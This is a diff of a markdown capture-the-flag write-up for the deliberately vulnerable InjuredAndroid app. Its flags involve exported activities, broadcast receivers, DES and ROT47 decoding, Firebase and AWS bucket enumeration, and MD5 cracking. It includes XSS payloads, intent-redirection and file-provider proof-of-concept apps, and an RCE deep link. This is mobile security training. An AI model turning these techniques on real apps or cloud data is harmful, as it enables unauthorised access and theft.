@@ -1,13 +1,44 @@
+---
+title: Injured Android
+description: ""
+tags:
+  - XSS
+  - strings
+  - SQLite
+  - activity
+  - broadcast
+  - crypto
+  - aws
+  - firebase
+  - intents
+  - file-providers
+  - deep-links
+  - examples
+  - android
+keywords:
+  - android reversing
+  - ctf writeup
+  - mobile writeups
+  - apk decompilation
+  - frida tool
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Injured%20Android/
+---
+
 This CTF Mobile has taken from here:
+
 https://github.com/B3nac/InjuredAndroid
 
 I use a **Genymotion Android device (API 29)** for this challenge.
+
 For install and use the application, you must install an **ARM Translator**. I use the **.zip** file for Android 9.0, it's work fine for the emulator.
 
 You can find the translator here:
+
 https://github.com/m9rco/Genymotion_ARM_Translation
 
 ### First steps
+
 There are so many flags in the application, so first we need extract the content with **apktool**
 ```bash
 apktool d injuredAnrdoid.apk
@@ -21,7 +52,9 @@ adb install -r injuredAndroid.apk
 ![[injuredAndroid1.png]]
 
 Now we are ready for start the CTF!
+
 **NOTE:**
+
 Check if you can execute the **XSSTEXT** with
 ```javascript
 <script>alert('xss')</script>
@@ -34,11 +67,13 @@ And try see the last button (flags overview)
 ![[injuredAndroid3.png]]
 
 If you can see the content of the previous image, then you are ready for start the challenge!
+
 Feel free of use the **hints** that you can find in every flag in the red button.
 
 ### Flag 1 - LOGIN
 
 The first step is **load the .apk** into **jadx** for an **static analysis**.
+
 We'll search the **b3nac.injuredandroid** package and see the **FlagOneLoginActivity** class source code.
 
 Looking into the code, we can found the flag.
@@ -60,6 +95,7 @@ public final void submitFlag(View view) {
 ### Flag 2 - EXPORTED ACTIVITY
 
 I found in the source code, this activity: **b25lActivity**
+
 That when is called (**clicked**) this is the code that is executed:
 ```java
 public void onCreate(Bundle bundle) {  
@@ -85,11 +121,13 @@ adb shell am start b3nac.injuredandroid/.b25lActivity
 ```
 
 **adb shell** execute a command.
+
 **am start** (a)ctivity (m)anager start (an activity) that is in packagename/.activity
 
 And we can see that the activity is executed, displaying the second flag.
 
 **Flag:** S3c0nd_F1ag
+
 In this flag we don't need put the string of the flag, because if we pay attention in the Java code of the beginning we can see that the **flagTwoButtonColor** has changed.
 
 ### Flag 3 - RESOURCES
@@ -137,12 +175,14 @@ public final void submitFlag(View view) {
 ```
 
 We have the variable **a2** that is **decoded**.
+
 In the line
 ```java
 byte[] a2 = new g().a();
 ```
 
 We can see that call to the **g** class, that call the **a** method.
+
 The **g** class have this content:
 ```java
 public class g {  
@@ -157,18 +197,22 @@ public class g {
 ```
 
 The function **a** return the **f1468a** value that is **NF9vdmVyZG9uZV9vbWVsZXRz** in **base64**.
+
 Then
 ```bash
 echo 'NF9vdmVyZG9uZV9vbWVsZXRz' | base64 -d
 ```
 
 We have the flag.
+
 **Flag:** 4_overdone_omelets
 
 ### Flag 5 - EXPORTED BROADCAST RECEIVER
 
 We can see two activities, called **FlagFiveActivity** (**A**) and **FlagFiveReceiver** (**B**).
+
 **B** is initialized in **A**.
+
 And there are the **F** function that send a **custom broadcast**
 ```java
 public void F() {  
@@ -197,6 +241,7 @@ new ComponentName(this, (Class<?>) FlagFiveReceiver.class);
 ```
 
 Is important, we can see that automatically is executed when the **Activity** **A** is called.
+
 **A** send a **broadcast** (**x**) to **B** and execute **H**.
 
 Let's inspect the source code of **FlagFiveReceiver**.
@@ -241,6 +286,7 @@ public void onReceive(Context context, Intent intent) {
 ```
 
 The **onReceive** method, declare the **i2** variable in 0.
+
 And **if** **i2** is 0, then we get this message:
 
 ![[injuredAndroid4.png]]
@@ -256,6 +302,7 @@ And **if i2** is 2, then we get the flag automatically (check flag overviews act
 And then, **when i2 is 2**, the counter now is 0.
 
 **Flag:** {F1v3!}
+
 In this flag isn't necessary put the flag in some field.
 
 ### Flag 6 - LOGIN 3
@@ -275,6 +322,7 @@ public final void submitFlag(View view) {
 ```
 
 The flag compare the result of **k.a** applied to this encoded string: **k3FElEG9ln...** 
+
 So, this is **k.a** method
 ```java
 public static String a(String str) {
@@ -296,6 +344,7 @@ public static String a(String str) {
 ```
 
 This verify if the string is in **base64** and then try decode using **DES** with the key of **f1472a**.
+
 **f1472a** is obtained from the **h** class using method **h.b**:
 ```java
 public class h {
@@ -313,6 +362,7 @@ public class h {
 ```
 
 The key **f1469a** is decoded from the string **Q2FwdHVyM1RoMXM=** that is **Captur3Th1s**.
+
 This value is used as the **DES key** in the **k.a** method.
 
 Then, for decode this with **python** we can use this script:
@@ -340,6 +390,7 @@ print(f"Flag 6: {plain_text}")
 ```
 
 Why we use **Captur3T**?
+
 The DES key must be exactly 8 bytes, for structure and design of algorithms reasons.
 
 **Flag:** {This_Isn't_Where_I_Parked_My_Car}
@@ -347,6 +398,7 @@ The DES key must be exactly 8 bytes, for structure and design of algorithms reas
 ### Flag 7 - SQLITE
 
 I have the script **sqlitedatabases.js**
+
 https://github.com/lautarovculic/fridaScripts/blob/main/enum/sqlitedatabases.js
 
 We can launch the application using this script with the command
@@ -412,6 +464,7 @@ john --format=raw-MD5 hashSeven.txt --wordlist=/usr/share/seclists/rockyou.txt
 Result: **hunter2**
 
 And in the first output, we have the string **9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?**
+
 As "**subtitle**".
 
 And we can found that in the **h** class
@@ -445,17 +498,23 @@ public class h {
 ```
 
 Where we can see that is an **ROT47**.
+
 Then in CyberChef we can rotate 47 times the string, with the output: https://injuredandroid.firebaseio.com/sqlite.json
 
 And if we run a **curl** command to the **firebase** url, we get **S3V3N_11**.
+
 So, just insert **S3V3N_11** in the first field, and **hunter2** in the second field.
+
 Submit the flag and move to the next flag.
 
 ### Flag 8 - AWS
 
 Looking the source code, it's about **AWS** bucket.
+
 We can use this tool:
+
 https://github.com/initstring/cloud_enum
+
 Install the tool and then, run
 ```bash
 python3 cloud_enum.py -k injuredandroid
@@ -475,21 +534,28 @@ Output:
 ### Flag 9 - FIREBASE
 
 As the previous flag, this is about **firebase** database misconfiguration.
+
 We can see this string in base64 **ZmxhZ3Mv**
+
 That decoded is
 ```bash
 echo 'ZmxhZ3Mv' | base64 -d
 ```
 
 Output: **flags/**
+
 The code say that this string is a directory.
+
 And by intuition, we can conclude that the url is
+
 https://injuredandroid.firebaseio.com/flags/
 
 So, the most common trick for **firebase** is the **.json** extension at the end of **every database** here, so if we **curl** this url
+
 https://injuredandroid.firebaseio.com/flags/.json
 
 We get the flag `[nine!_flag]`.
+
 If we inspect the source code, the flag must be send in **base64** encoded.
 
 **Flag:** W25pbmUhX2ZsYWdd
@@ -497,16 +563,20 @@ If we inspect the source code, the flag must be send in **base64** encoded.
 ### Flag 10 - UNICODE
 
 Researching in this article:
+
 https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n
 
 We have the `John@Github.com` email. Then
+
 We need log in via **firebase** auth, looking for activities an searching the classes called in **FlagTenUnicodeActivity**, I found the class **QXV0aA**, which is **exportable**.
+
 Then, run:
 ```bash
 adb shell am start -n b3nac.injuredandroid/.QXV0aA
 ```
 
 And we press the **login** button, and now we are logged in.
+
 In this code
 ```java
 public void b(com.google.firebase.database.a aVar) {  
@@ -547,6 +617,7 @@ public void b(com.google.firebase.database.a aVar) {
 ```
 
 With my friend **GPT** I conclude that the **UTF-8** can collision if we use `ı`.
+
 That is an i without the .
 
 **Flag:** John@Gıthub.com
@@ -570,9 +641,13 @@ public void onCreate(Bundle bundle) {
 ```
 
 Let's explain the code
+
 **setContentView(R.layout.activity_deep_link)**: The content is establish from an **XML** layout.
+
 **Intent intent = getIntent()**: Get the intent that the activity has started.
+
 **d.s.d.g.d(intent, "intentToUri")**: Just check the **Uri**
+
 **Uri data = intent.getData()**: Obtain intent data in **Uri** format.
 
 And the most important line
@@ -607,14 +682,19 @@ adb shell am start -W -a android.intent.action.VIEW -d "flag11://"
 ```
 
 Command explained:
+
 - **am start**: Activity Manager, start an Activity :P
+
 - **-W**: Wait for the startup operation to complete.
+
 - **-a android.intent.action.VIEW**: Intent action as **VIEW**.
+
 - **-d "flag11://**: Set the data of the intent in URI format with **flag11** as scheme -> flag11://
 
 ![[injuredAndroid7.png]]
 
 Now we are into the Activity, but now we need get the flag.
+
 So, looking the hints, we need **look for an binary compiled**.
 
 I find this binaries files:
@@ -651,6 +731,7 @@ HIIMASTRING
 We have the **protected** activity named as **FlagTwelveProtectedActivity**, we can't access directly to the activity (and it's **not exported**). Then, accord to the challenge, we have the activity **ExportedProtectedIntent**.
 
 Let's start analyzing the source code of **FlagTwelveProtectedActivity**
+
 In the **AndroidManifest.xml** file, we have the following:
 ```XML
 <activity  
@@ -692,12 +773,17 @@ public void onCreate(Bundle bundle) {
 ```
 
 This code 
+
 Establish a **webview** as content of the activity.
+
 Obtain a **extra string** named **totally_secure** from the **intent** and is converted to **Uri**.
+
 If the intent is null or not contains the extra totally_secure, the activity is closed.
+
 If the **Uri schema** isn't **https**, load the string **totally_secure** as HTML in the **webview**.
 
 Now let's check the **ExportedProtectedIntent** activity.
+
 In the **AndroidManifest.XML** file, we found
 ```XML
 <activity  
@@ -709,6 +795,7 @@ In the **AndroidManifest.XML** file, we found
 ```
 
 Here we can see that this activity **is exported**, then, we can call it directly.
+
 Looking the *our interest* java code:
 ```java
 private void F(Intent intent) {  
@@ -734,18 +821,24 @@ public void onCreate(Bundle bundle) {
 ```
 
 The method **F**
+
 Receive an **Intent** and extract other **Intent** from extras with the key **access_protected_component**.
+
 If the **Intent** extracted can be the result, and the activity **is from a package** *b3nac.injuredandroid*, the activity is **started**.
 
 Then, how we proceed? Let's enumerate the key points of each activity and see how we can exploit that.
 
 **FlagTwelveProtectedActivity**
 - Obtain the URL from the **Intent** extras **totally_secure** and load in the **webview**.
+
 - If the URL isn't HTTPS, then, load as HTML.
 
 **ExportedProtectedIntent**
+
 - Is exported and **can be called by other applications**.
+
 - The class receive an **Intent** that contain **another** intent (**access_protected_component**).
+
 - If the intern **intent** is for an **activity inside of the b3nac.injuredandroid package**, this is initialized (our malicious apk will abuse of this).
 
 Then, we need open android studio a craft the app.
@@ -792,8 +885,11 @@ We can see that the application was exploited and the flag automatically is call
 **Flag:** In this flag isn't necessary put the flag in some field.
 
 **NOTE**
+
 You want exploit an **XSS**? ;)
+
 Then, I comment that **If the URL isn't HTTPS, then, load as HTML**.
+
 Just change **the URL of our malicious app for**
 ```java
 Intent twelveIntent = new Intent();  
@@ -806,6 +902,7 @@ twelveIntent.putExtra("totally_secure", "<html><body><script>alert('xss');</scri
 ### Flag 13 - RCE
 
 We have the **RCEActivity** activity.
+
 Checking the **AndroidManifest.xml** file
 ```XML
 <activity  
@@ -824,16 +921,21 @@ Checking the **AndroidManifest.xml** file
 ```
 
 Pay attention in the **intent-filter** and **data**.
+
 We have the **flag13** as scheme (**flag13://**)
+
 And **rce** as host.
 
 The **URL** for now is **flag13://rce**
 
 Then, looking the source code, we need get a **binary** file.
+
 According our **android device**, in my case I use a rooted genymotion device, which architecture is **x86_64**.
 
 I use **narnia.x86_64** file.
+
 Then, giving **chmod +** permission to these files with **adb**.
+
 We can see that the files is already with **execute** perms.
 ```bash
 vbox86p:/data/data/b3nac.injuredandroid/files # ls -la
@@ -847,12 +949,15 @@ drwx------ 10 u0_a80 u0_a80    4096 2024-07-29 18:38 ..
 ```
 
 If not, just give **chmod +x** command to the binary.
+
 I'll use **ghidra** for get information about this binary.
+
 And searching for strings, I found this:
 
 ![[injuredAndroid11.png]]
 
 This appear as an **help** menu command.
+
 Then, in my box I execute the commands **chmod +x** and run the binary with help param.
 ```bash
 ./narnia.x86_64 --help
@@ -881,11 +986,15 @@ try {
 ```
 
 We can try go to the **URL**.
+
 Until now, we have **flag13://rce**
 
 Then, we can call the url with the previous params, like:
+
 **flag13://rce?binary=narnia.x86_64&param=testOne**
+
 **flag13://rce?binary=narnia.x86_64&param=testTwo**
+
 **flag13://rce?binary=narnia.x86_64&param=testThree**
 
 And the **combined** param?
@@ -899,6 +1008,7 @@ if (queryParameter3 != null) {
 ```
 
 It's look like
+
 **flag13://rce?combined=Treasure_Planet**
 
 Now, we can create an **index.html** file with
@@ -947,7 +1057,9 @@ The **AndroidManifest.xml** contains the following activity
 ```
 
 We'll need is the **android:authorities** for the PoC.
+
 We can see that **android:grantUriPermissions** is set to **true**.
+
 This mean that *an exported activity can interact with this File Provider* via intents that specify the correct uri according to **file_paths.xml**
 
 ```XML
@@ -966,7 +1078,9 @@ This mean that *an exported activity can interact with this File Provider* via i
 ```
 
 The specification of **files-path** equals **/data/data/b3nac.injuredandroid/files**
+
 #### Using another activity to move files to the correct directory
+
 We can use the **deep link** of the flag 13 for moving the **test file** needed.
 
 ```HTML
@@ -988,6 +1102,7 @@ if (intent != null && intent.data != null) {
 If the intent is not null and the **intent.data** is **not equal** to null, the **files** in the **assets** directory will be **copied** to **/data/data/b3nac.injuredandroid/files**
 
 #### Create the proof of concept
+
 - Create the intent
 ```java
 Intent intent = new Intent();
@@ -1087,10 +1202,13 @@ public class MainActivity extends AppCompatActivity {
 ```
 
 Now when the PoC is used it won't display the **Log.d** result unless the back button is pressed.
+
 After pressing the back button **text.txt** will be displayed by logcat with the label **OHNO**.
 
 When submitting only text.txt notice that isn't quite yet the flag value that's needed. I left a hint in the submit function as a comment.
+
 **MD5**
+
 Hashing **text.txt** with the MD5 algorithm will provide the hash **034d361a5942e67697d17534f37ed5a9**.
 
 I hope you found it useful (:
